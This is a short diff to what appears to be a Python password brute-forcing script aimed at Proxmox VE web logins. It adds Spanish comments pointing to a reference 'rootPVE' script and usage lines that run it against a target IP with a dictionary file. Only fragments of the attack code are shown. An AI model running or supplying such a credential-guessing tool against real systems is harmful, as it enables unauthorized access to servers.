@@ -3,7 +3,7 @@ from datetime import datetime
 import threading
 from time import sleep
 
-global x 
+global x
 
 def attack(host, line, verbose, timeout):
     if verbose:
@@ -65,4 +65,11 @@ if __name__ == "__main__":
     timeout = int(args.timeout) if args.timeout else 1
 
     main(host, filepath, verbose, thread, timeout)
+
+# Script de referencia:
+#   https://github.com/0xlildoudou/rootPVE/blob/main/rootPVE.py
+# Para ejecutar:
+#   python3 Web-Proxmox.py --target <FQDN/IP> --Password <password_list>
+# Por ejemplo:
+#   python3 AtacarPVE.py --target 172.16.254.9 --Password /usr/share/dict/spanish
 
